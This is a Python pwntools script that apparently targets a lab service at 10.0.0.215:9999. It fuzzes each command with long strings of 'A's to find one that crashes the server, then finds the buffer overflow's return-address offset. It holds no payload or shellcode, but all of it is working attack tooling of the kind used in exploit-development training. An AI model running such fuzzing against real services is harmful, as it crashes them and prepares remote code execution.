#!/usr/bin/python3

import pwn
import time
import colorama

# Disable pwntools excessive verbosity
pwn.context.log_level = 'error'

# Main function
def main():
    # Connect to server
    conn = pwn.remote('10.0.0.215', 9999)
    conn.recvline()

    prettyPrint('Connecting to 10.0.0.215:9999')

    # Get the available commands from server
    commands = getAvailableCommands(conn)

    prettyPrint('Fuzzing commands...')

    # Fuzz the available commands and find one that crashes the server
    vulnCommand = fuzzCommands(conn, commands)

    prettyPrint('Crashed server!')
    prettyPrint('Found vulnerable command | ' + vulnCommand)

    # Wait for server to restart
    time.sleep(5)

    prettyPrint('Reconnecting to 10.0.0.215:9999')

    # Re-establish connection with the server
    conn = pwn.remote('10.0.0.215', 9999)
    conn.recvline()

    prettyPrint('Fuzzing vulnerable command...')

    # Fuzz the vulnerable command to find return address offset
    retOffset = fuzzCommand(conn, vulnCommand)

    prettyPrint('Crashed server!')
    prettyPrint('Found return address offset | ' + str(retOffset))

    # Wait for server to restart
    time.sleep(5)

    prettyPrint('Reconnecting to 10.0.0.215:9999')

    # Re-establish connection with the server
    conn = pwn.remote('10.0.0.215', 9999)
    conn.recvline()

    prettyPrint('Disconnecting from 10.0.0.215:9999')

    # Disconnect from server
    conn.close()

# Get available commands from server using 'HELP' command
def getAvailableCommands(conn):
    # Initialize commands to empty array
    commands = []

    # Send the help command
    conn.sendline('HELP')

    # Get the raw response and parse it
    rawResponse = conn.recvuntil('EXIT')
    rawResponseArray = rawResponse.split(b'\n')
    parsedResponseArray = rawResponseArray[2:len(rawResponseArray)-1]

    # Loop through the parsed response and add each command to commands
    for parsedCommand in parsedResponseArray:
        commands.append(parsedCommand.split(b' ')[0].decode('UTF-8'))

    # Return available commands
    return commands

# Fuzz available commands to find one that crashes the server
def fuzzCommands(conn, commands):
    # Initialize vulnCommand to empty string
    vulnCommand = ''

    # Recieve stray newline
    conn.recvline()

    # Loop through the available commands
    for command in commands:
        # Send the command with a parameter of 1024 A's
        parameter = 'A' * 1024
        conn.sendline(command + ' ' + parameter)
        
        try:
            conn.recvline()
        except:
            # If the server crashed set vulnCommand to the command that crashed it
            vulnCommand = command
            break

    # Return the command that crashed it
    return vulnCommand

# Fuzz a specific command to find return address offset for buffer overflow
def fuzzCommand(conn, command):
    # Initialize the parameter to be one A
    parameter = 'A'

    # While the server is still running
    while True:
        # Send the command with the parameter
        conn.sendline(command + ' ' + parameter)
        
        try:
            conn.recvline()
        except:
            # If the server crashed break out of loop
            break
        
        # Append an A to the parameter
        parameter += 'A'

    # Return the offset to the return address
    return len(parameter)-1

# Print text with a red '[*]' prepending it 
def prettyPrint(text):
    print(colorama.Fore.RED + '[*] ' + colorama.Fore.WHITE + text)

# Run main function
if __name__ == '__main__':
    main()
